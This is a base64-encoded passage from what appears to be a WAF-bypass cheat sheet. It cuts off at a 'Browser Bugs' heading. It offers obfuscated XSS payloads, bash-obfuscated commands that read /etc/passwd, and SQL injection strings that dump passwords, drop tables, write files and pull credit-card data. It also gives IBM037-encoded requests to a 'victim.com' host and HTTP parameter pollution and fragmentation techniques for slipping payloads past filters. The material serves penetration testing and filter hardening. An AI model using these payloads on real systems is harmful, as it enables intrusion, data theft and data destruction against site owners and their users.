cy4KLSBMaW5lIGJyZWFrcyAoQ1IvTEYpIGNhbiBicmVhayBmaXJld2FsbCBy
ZWdleCBhbmQgYnlwYXNzIHN0dWZmLgoKX19TdGFuZGFyZF9fOiBgPGlmcmFt
ZSBzcmM9amF2YXNjcmlwdDpjb25maXJtKDApIj5gICAKX19PYmZ1c2NhdGVk
X186IGA8aWZyYW1lIHNyYz0iJTBBaiUwQWElMEF2JTBBYSUwQXMlMEFjJTBB
ciUwQWklMEFwJTBBdCUwQSUzQWNvbmZpcm0oMCkiPmAKCl9fMTEuIFVuaW5p
dGlhbGl6ZWQgVmFyaWFibGVzX18KLSBVbmluaXRpYWxpemVkIGJhc2ggdmFy
aWFibGVzIGNhbiBldmFkZSBiYWQgcmVndWxhciBleHByZXNzaW9uIGJhc2Vk
IGZpbHRlcnMgYW5kIHBhdHRlcm4gbWF0Y2guCi0gVGhlc2UgaGF2ZSB2YWx1
ZSBlcXVhbCB0byBudWxsL3RoZXkgYWN0IGxpa2UgZW1wdHkgc3RyaW5ncy4K
LSBCb3RoIGJhc2ggYW5kIHBlcmwgYWxsb3cgdGhpcyBraW5kIG9mIGludGVy
cHJldGF0aW9ucy4KCj4gX19CT05VUzpfXyBWYXJpYWJsZSBuYW1lcyBjYW4g
aGF2ZSBhbnkgbnVtYmVyIG9mIHJhbmRvbSBjaGFyYWN0ZXJzLiBJIGhhdmUg
cmVwcmVzZW50ZWQgdGhlbSBoZXJlIGFzIGAkYWFhYWFhYCwgYCRiYmJiYmJg
LCBhbmQgc28gb24uIFlvdSBjYW4gcmVwbGFjZSB0aGVtIHdpdGggYW55IG51
bWJlciBvZiByYW5kb20gY2hhcnMgbGlrZSBgJHVzaGRqYWhgIGFuZCBzbyBv
bi4gIDspCgotIF9fTGV2ZWwgMSBPYmZ1c2NhdGlvbl9fOiBOb3JtYWwgIApf
X1N0YW5kYXJkX186IGAvYmluL2NhdCAvZXRjL3Bhc3N3ZGAgIApfX09iZnVz
Y2F0ZWRfXzogYC9iaW4vY2F0JHUgL2V0Yy9wYXNzd2QkdWAKCi0gX19MZXZl
bCAyIE9iZnVzY2F0aW9uX186IFBvc3Rpb24gQmFzZWQgIApfX1N0YW5kYXJk
X186IGAvYmluL2NhdCAvZXRjL3Bhc3N3ZGAgIApfX09iZnVzY2F0ZWRfXzog
PGNvZGU+JHU8Yj4vYmluPC9iPiR1PGI+L2NhdDwvYj4kdSAkdTxiPi9ldGM8
L2I+JHU8Yj4vcGFzc3dkPC9iPiR1PC9jb2RlPgoKLSBfX0xldmVsIDMgT2Jm
dXNjYXRpb25fXzogUmFuZG9tIGNoYXJhY3RlcnMgICAKX19TdGFuZGFyZF9f
OiBgL2Jpbi9jYXQgL2V0Yy9wYXNzd2RgICAKX19PYmZ1c2NhdGVkX186IDxj
b2RlPiRhYWFhYWE8Yj4vYmluPC9iPiRiYmJiYmI8Yj4vY2F0PC9iPiRjY2Nj
Y2NjICRkZGRkZGQ8Yj4vZXRjPC9iPiRlZWVlZWVlPGI+L3Bhc3N3ZDwvYj4k
ZmZmZmZmZjwvY29kZT4KCkFuIGV4b3RpYyBwYXlsb2FkIGNyYWZ0ZWQ6CmBg
YAokc2RpamNoa2QvPz8/JHNkamhza2RqaC8/P3Qkc2tkamZuc2tkaiAkc2Rv
ZmhzZGhqcy8/Pz8kb3NkaWhkaHNkai8/P3NzPz8kc2tkamhzaXVkZgpgYGAK
Cl9fMTIuIFRhYnMgYW5kIExpbmUgRmVlZHNfXwotIFRhYnMgb2Z0ZW4gaGVs
cCB0byBldmFkZSBmaXJld2FsbHMgZXNwZWNpYWxseSByZWdleCBiYXNlZCBv
bmVzLgotIFRhYnMgY2FuIGhlbHAgYnJlYWsgZmlyZXdhbGwgcmVnZXggd2hl
biB0aGUgcmVnZXggaXMgZXhwZWN0aW5nIHdoaXRlc3BhY2VzIGFuZCBub3Qg
dGFicy4KCl9fU3RhbmRhcmRfXzogYDxJTUcgU1JDPSJqYXZhc2NyaXB0OmFs
ZXJ0KCk7Ij5gICAKX19CeXBhc3NlZF9fOiBgPElNRyBTUkM9IiAgICBqYXZh
c2NyaXB0OmFsZXJ0KCk7Ij5gICAKX19WYXJpYW50X186IGA8SU1HIFNSQz0i
ICAgIGphdiAgICBhc2NyaSAgICBwdDphbGVydCAgICAoKTsiPmAKCl9fU3Rh
bmRhcmRfXzogYGh0dHA6Ly90ZXN0LmNvbS90ZXN0P2lkPTEgdW5pb24gc2Vs
ZWN0IDEsMiwzYCAgCl9fU3RhbmRhcmRfXzogYGh0dHA6Ly90ZXN0LmNvbS90
ZXN0P2lkPTElMDl1bmlvbiUyMyUwQSUwRHNlbGVjdCUyRCUyRCUwQSUwRDEs
MiwzYAoKX19TdGFuZGFyZF9fOiBgPGlmcmFtZSBzcmM9amF2YXNjcmlwdDph
bGVydCgxKT48L2lmcmFtZT5gICAKX19PYmZ1c2NhdGVkX186IApgYGAKPGlm
cmFtZSAgICBzcmM9aiZUYWI7YSZUYWI7diZUYWI7YSZUYWI7cyZUYWI7YyZU
YWI7ciZUYWI7aSZUYWI7cCZUYWI7dCZUYWI7OmEmVGFiO2wmVGFiO2UmVGFi
O3ImVGFiO3QmVGFiOyUyOCZUYWI7MSZUYWI7JTI5PjwvaWZyYW1lPgpgYGAK
Cl9fMTMuIFRva2VuIEJyZWFrZXJzX18KLSBBdHRhY2tzIG9uIHRva2VuaXpl
cnMgYXR0ZW1wdCB0byBicmVhayB0aGUgbG9naWMgb2Ygc3BsaXR0aW5nIGEg
cmVxdWVzdCBpbnRvIHRva2VucyB3aXRoIHRoZSBoZWxwIG9mIHRva2VuIGJy
ZWFrZXJzLgotIFRva2VuIGJyZWFrZXJzIGFyZSBzeW1ib2xzIHRoYXQgYWxs
b3cgYWZmZWN0aW5nIHRoZSBjb3JyZXNwb25kZW5jZSBiZXR3ZWVuIGFuIGVs
ZW1lbnQgb2YgYSBzdHJpbmcgYW5kIGEgY2VydGFpbiB0b2tlbiwgYW5kIHRo
dXMgYnlwYXNzIHNlYXJjaCBieSBzaWduYXR1cmUuCi0gSG93ZXZlciwgdGhl
IHJlcXVlc3QgbXVzdCBzdGlsbCByZW1haW4gdmFsaWQgd2hpbGUgdXNpbmcg
dG9rZW4tYnJlYWtlcnMuCgotIF9fQ2FzZV9fOiBVbmtub3duIFRva2VuIGZv
ciB0aGUgVG9rZW5pemVyICAKICAgIC0gX19QYXlsb2FkX186IGA/aWQ94oCY
LXNxbGl0ZV92ZXJzaW9uKCkgVU5JT04gU0VMRUNUIHBhc3N3b3JkIEZST00g
dXNlcnMgLS1gICAKCi0gX19DYXNlX186IFVua25vd24gQ29udGV4dCBmb3Ig
dGhlIFBhcnNlciAoTm90aWNlIHRoZSB1bmNvbnRleHRlZCBicmFja2V0KSAg
CiAgICAtIF9fUGF5bG9hZCAxX186IGA/aWQ9MTIzKTtEUk9QIFRBQkxFIHVz
ZXJzIC0tYCAgCiAgICAtIF9fUGF5bG9hZCAyX186IGA/aWQ9MTMzNykgSU5U
TyBPVVRGSUxFIOKAmHh4eOKAmSAtLWAgIAoKPiBfX1RJUDpfXyBNb3JlIHBh
eWxvYWRzIGNhbiBiZSBjcmFmdGVkIHZpYSB0aGlzIFtjaGVhdCBzaGVldF0o
aHR0cHM6Ly9naXRodWIuY29tL2F0dGFja2VyY2FuL2NwcC1zcWwtZnV6emVy
KS4KCl9fMTQuIE9iZnVzY2F0aW9uIGluIE90aGVyIEZvcm1hdHNfXyAgCi0g
TWFueSB3ZWIgYXBwbGljYXRpb25zIHN1cHBvcnQgZGlmZmVyZW50IGVuY29k
aW5nIHR5cGVzIGFuZCBjYW4gaW50ZXJwcmV0IHRoZSBlbmNvZGluZyAoc2Vl
IGJlbG93KS4KLSBPYmZ1c2NhdGluZyBvdXIgcGF5bG9hZCB0byBhIGZvcm1h
dCBub3Qgc3VwcG9ydGVkIGJ5IFdBRiBidXQgdGhlIHNlcnZlciBjYW4gc211
Z2dsZSBvdXIgcGF5bG9hZCBpbi4KCl9fQ2FzZTpfXyBJSVMgIAotIElJUzYs
IDcuNSwgOCBhbmQgMTAgKEFTUFggdjQueCkgYWxsb3cgX19JQk0wMzdfXyBj
aGFyYWN0ZXIgaW50ZXJwcmV0YXRpb25zLgotIFdlIGNhbiBlbmNvZGUgb3Vy
IHBheWxvYWQgYW5kIHNlbmQgdGhlIGVuY29kZWQgcGFyYW1ldGVycyB3aXRo
IHRoZSBxdWVyeS4KCk9yaWdpbmFsIFJlcXVlc3Q6CmBgYApQT1NUIC9zYW1w
bGUuYXNweD9pZDE9c29tZXRoaW5nIEhUVFAvMS4xCkhPU1Q6IHZpY3RpbS5j
b20KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVu
Y29kZWQ7IGNoYXJzZXQ9dXRmLTgKQ29udGVudC1MZW5ndGg6IDQxCgppZDI9
J3VuaW9uIGFsbCBzZWxlY3QgKiBmcm9tIHVzZXJzLS0KYGBgCk9iZnVzY2F0
ZWQgUmVxdWVzdCArIFVSTCBFbmNvZGluZzoKYGBgClBPU1QgL3NhbXBsZS5h
c3B4PyU4OSU4NCVGMT0lQTIlOTYlOTQlODUlQTMlODglODklOTUlODcgSFRU
UC8xLjEKSE9TVDogdmljdGltLmNvbQpDb250ZW50LVR5cGU6IGFwcGxpY2F0
aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1pYm0wMzcKQ29u
dGVudC1MZW5ndGg6IDExNQoKJTg5JTg0JUYyPSU3RCVBNCU5NSU4OSU5NiU5
NSU0MCU4MSU5MyU5MyU0MCVBMiU4NSU5MyU4NSU4MyVBMyU0MCU1QyU0MCU4
NiU5OSU5NiU5NCU0MCVBNCVBMiU4NSU5OSVBMiU2MCU2MApgYGAKClRoZSBm
b2xsb3dpbmcgdGFibGUgc2hvd3MgdGhlIHN1cHBvcnQgb2YgZGlmZmVyZW50
IGNoYXJhY3RlciBlbmNvZGluZ3Mgb24gdGhlIHRlc3RlZCBzeXN0ZW1zICh3
aGVuIG1lc3NhZ2VzIGNvdWxkIGJlIG9iZnVzY2F0ZWQgdXNpbmcgdGhlbSk6
Cj4gX19USVA6X18gWW91IGNhbiB1c2UgW3RoaXMgc21hbGwgcHl0aG9uIHNj
cmlwdF0ob3RoZXJzL29iZnUucHkpIHRvIGNvbnZlcnQgeW91ciBwYXlsb2Fk
cyBhbmQgcGFyYW1ldGVycyB0byB5b3VyIGRlc2lyZWQgZW5jb2RpbmdzLgoK
PHRhYmxlPgogICAgPHRyPgogICAgICAgIDx0ZCB3aWR0aD0iMjAlIiBhbGln
bj0iY2VudGVyIj48Yj5UYXJnZXQ8L2I+PC90ZD4KICAgICAgICA8dGQgd2lk
dGg9IjM1JSIgYWxpZ249ImNlbnRlciI+PGI+RW5jb2RpbmdzPC9iPjwvdGQ+
CiAgICAgICAgPHRkIHdpZHRoPSI1NSUiIGFsaWduPSJjZW50ZXIiPjxiPk5v
dGVzPC9iPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD5O
Z2lueCwgdVdTR0ktRGphbmdvLVB5dGhvbjM8L3RkPgogICAgICAgIDx0ZD5J
Qk0wMzcsIElCTTUwMCwgY3A4NzUsIElCTTEwMjYsIElCTTI3MzwvdGQ+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8
bGk+UXVlcnkgc3RyaW5nIGFuZCBib2R5IG5lZWQgdG8gYmUgZW5jb2RlZC48
L2xpPgogICAgICAgICAgICAgICAgPGxpPlVybC1kZWNvZGVkIHBhcmFtZXRl
cnMgaW4gcXVlcnkgc3RyaW5nIGFuZCBib2R5LjwvbGk+CiAgICAgICAgICAg
ICAgICA8bGk+RXF1YWwgc2lnbiBhbmQgYW1wZXJzYW5kIG5lZWRlZCB0byBi
ZSBlbmNvZGVkIGFzIHdlbGwgKG5vIHVybC1lbmNvZGluZykuPC9saT4KICAg
ICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0
cj4KICAgICAgICA8dGQ+TmdpbngsIHVXU0dJLURqYW5nby1QeXRob24yPC90
ZD4KICAgICAgICA8dGQ+SUJNMDM3LCBJQk01MDAsIGNwODc1LCBJQk0xMDI2
LCB1dGYtMTYsIHV0Zi0zMiwgdXRmLTMyQkUsIElCTTQyNDwvdGQ+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+
UXVlcnkgc3RyaW5nIGFuZCBib2R5IG5lZWQgdG8gYmUgZW5jb2RlZC48L2xp
PgogICAgICAgICAgICAgICAgPGxpPlVybC1kZWNvZGVkIHBhcmFtZXRlcnMg
aW4gcXVlcnkgc3RyaW5nIGFuZCBib2R5IGFmdGVyd2FyZHMuPC9saT4KICAg
ICAgICAgICAgICAgIDxsaT5FcXVhbCBzaWduIGFuZCBhbXBlcnNhbmQgc2hv
dWxkIG5vdCBiZSBlbmNvZGVkIGluIGFueSB3YXkuPC9saT4KICAgICAgICAg
ICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+QXBhY2hlLVRPTUNBVDgtSlZNMS44LUpTUDwvdGQ+CiAgICAg
ICAgPHRkPklCTTAzNywgSUJNNTAwLCBJQk04NzAsIGNwODc1LCBJQk0xMDI2
LAogICAgICAgIElCTTAxMTQwLCBJQk0wMTE0MSwgSUJNMDExNDIsIElCTTAx
MTQzLCBJQk0wMTE0NCwKICAgICAgICBJQk0wMTE0NSwgSUJNMDExNDYsIElC
TTAxMTQ3LCBJQk0wMTE0OCwgSUJNMDExNDksCiAgICAgICAgdXRmLTE2LCB1
dGYtMzIsIHV0Zi0zMkJFLCBJQk0yNzMsIElCTTI3NywgSUJNMjc4LAogICAg
ICAgIElCTTI4MCwgSUJNMjg0LCBJQk0yODUsIElCTTI5MCwgSUJNMjk3LCBJ
Qk00MjAsCiAgICAgICAgSUJNNDI0LCBJQk0tVGhhaSwgSUJNODcxLCBjcDEw
MjU8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPlF1ZXJ5IHN0cmluZyBpbiBpdHMgb3JpZ2luYWwgZm9y
bWF0IChjb3VsZCBiZSB1cmwtZW5jb2RlZCBhcyB1c3VhbCkuPC9saT4KICAg
ICAgICAgICAgICAgIDxsaT5Cb2R5IGNvdWxkIGJlIHNlbnQgd2l0aC93aXRo
b3V0IHVybC1lbmNvZGluZy48L2xpPgogICAgICAgICAgICAgICAgPGxpPkVx
dWFsIHNpZ24gYW5kIGFtcGVyc2FuZCBzaG91bGQgbm90IGJlIGVuY29kZWQg
aW4gYW55IHdheS48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwv
dGQ+ICAgICAgICAgICAKICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRk
PkFwYWNoZS1UT01DQVQ3LUpWTTEuNi1KU1A8L3RkPgogICAgICAgIDx0ZD5J
Qk0wMzcsIElCTTUwMCwgSUJNODcwLCBjcDg3NSwgSUJNMTAyNiwKICAgICAg
ICBJQk0wMTE0MCwgSUJNMDExNDEsIElCTTAxMTQyLCBJQk0wMTE0MywgSUJN
MDExNDQsCiAgICAgICAgSUJNMDExNDUsIElCTTAxMTQ2LCBJQk0wMTE0Nywg
SUJNMDExNDgsIElCTTAxMTQ5LAogICAgICAgIHV0Zi0xNiwgdXRmLTMyLCB1
dGYtMzJCRSwgSUJNMjczLCBJQk0yNzcsIElCTTI3OCwKICAgICAgICBJQk0y
ODAsIElCTTI4NCwgSUJNMjg1LCBJQk0yOTcsIElCTTQyMCwgSUJNNDI0LAog
ICAgICAgIElCTS1UaGFpLCBJQk04NzEsIGNwMTAyNTwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+UXVl
cnkgc3RyaW5nIGluIGl0cyBvcmlnaW5hbCBmb3JtYXQgKGNvdWxkIGJlIHVy
bC1lbmNvZGVkIGFzIHVzdWFsKS48L2xpPgogICAgICAgICAgICAgICAgPGxp
PkJvZHkgY291bGQgYmUgc2VudCB3aXRoL3dpdGhvdXQgdXJsLWVuY29kaW5n
LjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+RXF1YWwgc2lnbiBhbmQgYW1w
ZXJzYW5kIHNob3VsZCBub3QgYmUgZW5jb2RlZCBpbiBhbnkgd2F5LjwvbGk+
CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4gCiAgICA8L3RyPgog
ICAgPHRyPgogICAgICAgIDx0ZD5JSVM2LCA3LjUsIDgsIDEwIC1BU1BYICh2
NC54KTwvdGQ+CiAgICAgICAgPHRkPklCTTAzNywgSUJNNTAwLCBJQk04NzAs
IGNwODc1LCBJQk0xMDI2LAogICAgICAgIElCTTAxMDQ3LCBJQk0wMTE0MCwg
SUJNMDExNDEsIElCTTAxMTQyLCBJQk0wMTE0MywKICAgICAgICBJQk0wMTE0
NCwgSUJNMDExNDUsIElCTTAxMTQ2LCBJQk0wMTE0NywgSUJNMDExNDgsCiAg
ICAgICAgSUJNMDExNDksIHV0Zi0xNiwgdW5pY29kZUZGRkUsIHV0Zi0zMiwg
dXRmLTMyQkUsCiAgICAgICAgSUJNMjczLCBJQk0yNzcsIElCTTI3OCwgSUJN
MjgwLCBJQk0yODQsIElCTTI4NSwKICAgICAgICBJQk0yOTAsIElCTTI5Nywg
SUJNNDIwLElCTTQyMywgSUJNNDI0LCB4LUVCQ0RJQy1Lb3JlYW5FeHRlbmRl
ZCwKICAgICAgICBJQk0tVGhhaSwgSUJNODcxLCBJQk04ODAsIElCTTkwNSwg
SUJNMDA5MjQsIGNwMTAyNTwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+UXVlcnkgc3RyaW5nIGluIGl0
cyBvcmlnaW5hbCBmb3JtYXQgKGNvdWxkIGJlIHVybC1lbmNvZGVkIGFzIHVz
dWFsKS48L2xpPgogICAgICAgICAgICAgICAgPGxpPkJvZHkgY291bGQgYmUg
c2VudCB3aXRoL3dpdGhvdXQgdXJsLWVuY29kaW5nLjwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+RXF1YWwgc2lnbiBhbmQgYW1wZXJzYW5kIHNob3VsZCBu
b3QgYmUgZW5jb2RlZCBpbiBhbnkgd2F5LjwvbGk+CiAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgPC90ZD4gCiAgICA8L3RyPgo8L3RhYmxlPgoKIyMjIEhU
VFAgUGFyYW1ldGVyIFBvbGx1dGlvbgojIyMjIE1ldGhvZDoKLSBUaGlzIGF0
dGFjayBtZXRob2QgaXMgYmFzZWQgb24gaG93IGEgc2VydmVyIGludGVycHJl
dHMgcGFyYW1ldGVycyB3aXRoIHRoZSBzYW1lIG5hbWVzLgotIFBvc3NpYmxl
IGJ5cGFzcyBjaGFuY2VzIGhlcmUgYXJlOgogICAgLSBUaGUgc2VydmVyIHVz
ZXMgdGhlIGxhc3QgcmVjZWl2ZWQgcGFyYW1ldGVyLCBhbmQgV0FGIGNoZWNr
cyBvbmx5IHRoZSBmaXJzdC4KICAgIC0gVGhlIHNlcnZlciB1bml0ZXMgdGhl
IHZhbHVlIGZyb20gc2ltaWxhciBwYXJhbWV0ZXJzLCBhbmQgV0FGIGNoZWNr
cyB0aGVtIHNlcGFyYXRlbHkuCgojIyMjIFRlY2huaXF1ZToKLSBUaGUgaWRl
YSBpcyB0byBlbnVtZXJhdGUgaG93IHRoZSBwYXJhbWV0ZXJzIGFyZSBiZWlu
ZyBpbnRlcnByZXRlZCBieSB0aGUgc2VydmVyLgotIEluIHN1Y2ggYSBjYXNl
IHdlIGNhbiBwYXNzIHRoZSBwYXlsb2FkIHRvIGEgcGFyYW1ldGVyIHdoaWNo
IGlzbid0IGJlaW5nIGluc3BlY3RlZCBieSB0aGUgV0FGLgotIERpc3RyaWJ1
dGluZyBhIHBheWxvYWQgYWNyb3NzIHBhcmFtZXRlcnMgd2hpY2ggY2FuIGxh
dGVyIGdldCBjb25jYXRlbmF0ZWQgYnkgdGhlIHNlcnZlciBpcyBhbHNvIHVz
ZWZ1bC4KCkJlbG93IGlzIGEgY29tcGFyaXNvbiBvZiBkaWZmZXJlbnQgc2Vy
dmVycyBhbmQgdGhlaXIgcmVsYXRpdmUgaW50ZXJwcmV0YXRpb25zOgoKPHRh
YmxlPgogICAgPHRyPgogICAgICAgIDx0ZCB3aWR0aD0iNDAlIiBhbGlnbj0i
Y2VudGVyIj48Yj5FbnZpcm9ubWVudDwvYj48L3RkPgogICAgICAgIDx0ZCB3
aWR0aD0iNDAlIiBhbGlnbj0iY2VudGVyIj48Yj5QYXJhbWV0ZXIgSW50ZXJw
cmV0YXRpb248L2I+PC90ZD4KICAgICAgICA8dGQgYWxpZ249ImNlbnRlciI+
PGI+RXhhbXBsZTwvYj48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQgYWxpZ249ImNlbnRlciI+QVNQL0lJUzwvdGQ+CiAgICAgICAgPHRk
IGFsaWduPSJjZW50ZXIiPkNvbmNhdGVuYXRpb24gYnkgY29tbWE8L3RkPgog
ICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5wYXIxPXZhbDEsdmFsMjwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVy
Ij5KU1AsIFNlcnZsZXQvQXBhY2hlIFRvbWNhdDwvdGQ+CiAgICAgICAgPHRk
IGFsaWduPSJjZW50ZXIiPkZpcnN0IHBhcmFtZXRlciBpcyByZXN1bHRpbmc8
L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5wYXIxPXZhbDE8L3Rk
PgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQgYWxpZ249ImNlbnRl
ciI+QVNQLk5FVC9JSVM8L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVy
Ij5Db25jYXRlbmF0aW9uIGJ5IGNvbW1hPC90ZD4KICAgICAgICA8dGQgYWxp
Z249ImNlbnRlciI+cGFyMT12YWwxLHZhbDI8L3RkPgogICAgPC90cj4KICAg
IDx0cj4KICAgICAgICA8dGQgYWxpZ249ImNlbnRlciI+UEhQL1pldXM8L3Rk
PgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5MYXN0IHBhcmFtZXRlciBp
cyByZXN1bHRpbmc8L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5w
YXIxPXZhbDI8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQg
YWxpZ249ImNlbnRlciI+UEhQL0FwYWNoZTwvdGQ+CiAgICAgICAgPHRkIGFs
aWduPSJjZW50ZXIiPkxhc3QgcGFyYW1ldGVyIGlzIHJlc3VsdGluZzwvdGQ+
CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPnBhcjE9dmFsMjwvdGQ+CiAg
ICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5K
U1AsIFNlcnZsZXQvSmV0dHk8L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2Vu
dGVyIj5GaXJzdCBwYXJhbWV0ZXIgaXMgcmVzdWx0aW5nPC90ZD4KICAgICAg
ICA8dGQgYWxpZ249ImNlbnRlciI+cGFyMT12YWwxPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPklCTSBMb3R1
cyBEb21pbm88L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5GaXJz
dCBwYXJhbWV0ZXIgaXMgcmVzdWx0aW5nPC90ZD4KICAgICAgICA8dGQgYWxp
Z249ImNlbnRlciI+cGFyMT12YWwxPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+
CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPklCTSBIVFRQIFNlcnZlcjwv
dGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPkxhc3QgcGFyYW1ldGVy
IGlzIHJlc3VsdGluZzwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIi
PnBhcjE9dmFsMjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZCBhbGlnbj0iY2VudGVyIj5tb2RfcGVybCwgbGliYXBlcTIvQXBhY2hlPC90
ZD4KICAgICAgICA8dGQgYWxpZ249ImNlbnRlciI+Rmlyc3QgcGFyYW1ldGVy
IGlzIHJlc3VsdGluZzwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIi
PnBhcjE9dmFsMTwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZCBhbGlnbj0iY2VudGVyIj5PcmFjbGUgQXBwbGljYXRpb24gU2VydmVyIDEw
RzwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPkZpcnN0IHBhcmFt
ZXRlciBpcyByZXN1bHRpbmc8L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2Vu
dGVyIj5wYXIxPXZhbDE8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQgYWxpZ249ImNlbnRlciI+UGVybCBDR0kvQXBhY2hlPC90ZD4KICAg
ICAgICA8dGQgYWxpZ249ImNlbnRlciI+Rmlyc3QgcGFyYW1ldGVyIGlzIHJl
c3VsdGluZzwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPnBhcjE9
dmFsMTwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZCBhbGln
bj0iY2VudGVyIj5QeXRob24vWm9wZTwvdGQ+CiAgICAgICAgPHRkIGFsaWdu
PSJjZW50ZXIiPkZpcnN0IHBhcmFtZXRlciBpcyByZXN1bHRpbmc8L3RkPgog
ICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5wYXIxPXZhbDE8L3RkPgogICAg
PC90cj4KICAgIDx0cj4KICAgICAgICA8dGQgYWxpZ249ImNlbnRlciI+SWNl
V2FycDwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPkFuIGFycmF5
IGlzIHJldHVybmVkPC90ZD4KICAgICAgICA8dGQgYWxpZ249ImNlbnRlciI+
Wyd2YWwxJywndmFsMiddPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAg
ICAgPHRkIGFsaWduPSJjZW50ZXIiPkFYSVMgMjQwMDwvdGQ+CiAgICAgICAg
PHRkIGFsaWduPSJjZW50ZXIiPkxhc3QgcGFyYW1ldGVyIGlzIHJlc3VsdGlu
ZzwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPnBhcjE9dmFsMjwv
dGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZCBhbGlnbj0iY2Vu
dGVyIj5EQk1hbjwvdGQ+CiAgICAgICAgPHRkIGFsaWduPSJjZW50ZXIiPkNv
bmNhdGVuYXRpb24gYnkgdHdvIHRpbGRlczwvdGQ+CiAgICAgICAgPHRkIGFs
aWduPSJjZW50ZXIiPnBhcjE9dmFsMX5+dmFsMjwvdGQ+CiAgICA8L3RyPgog
ICAgPHRyPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVyIj5tb2Qtd3NnaSAo
UHl0aG9uKS9BcGFjaGU8L3RkPgogICAgICAgIDx0ZCBhbGlnbj0iY2VudGVy
Ij5BbiBhcnJheSBpcyByZXR1cm5lZDwvdGQ+CiAgICAgICAgPHRkIGFsaWdu
PSJjZW50ZXIiPkFSUkFZKDB4OGI5MDU4Yyk8L3RkPgogICAgPC90cj4KPC90
YWJsZT4KCiMjIyBIVFRQIFBhcmFtZXRlciBGcmFnbWVudGF0aW9uCi0gSFBG
IGlzIGJhc2VkIG9uIHRoZSBwcmluY2lwbGUgd2hlcmUgdGhlIHNlcnZlciB1
bml0ZXMgdGhlIHZhbHVlIGJlaW5nIHBhc3NlZCBhbG9uZyB0aGUgcGFyYW1l
dGVycy4KLSBXZSBjYW4gc3BsaXQgdGhlIHBheWxvYWQgaW50byBkaWZmZXJl
bnQgY29tcG9uZW50cyBhbmQgdGhlbiBwYXNzIHRoZSB2YWx1ZXMgdmlhIHRo
ZSBwYXJhbWV0ZXJzLgoKX19TYW1wbGUgUGF5bG9hZF9fOiBgMTAwMSBSTElL
RSAoLSgtMSkpIFVOSU9OIFNFTEVDVCAxIEZST00gQ1JFRElUX0NBUkRTYCAg
Cl9fU2FtcGxlIFF1ZXJ5IFVSTF9fOiBgaHR0cDovL3Rlc3QuY29tL3VybD9h
PTEwMDErUkxJS0UmYj0oLSgtMSkpK1VOSU9OJmM9U0VMRUNUKzEmZD1GUk9N
K0NSRURJVF9DQVJEU2AKPiBfX1RJUDpfXyBBIHJlYWwgbGlmZSBleGFtcGxl
IGhvdyBieXBhc3NlcyBjYW4gYmUgY3JhZnRlZCB1c2luZyB0aGlzIG1ldGhv
ZCBjYW4gYmUgZm91bmQgW2hlcmVdKGh0dHA6Ly9saXN0cy53ZWJhcHBzZWMu
b3JnL3BpcGVybWFpbC93ZWJzZWN1cml0eV9saXN0cy53ZWJhcHBzZWMub3Jn
LzIwMDktQXVndXN0LzAwNTY3My5odG1sKS4KCiMjIyBCcm93c2VyIEJ1Z3M6
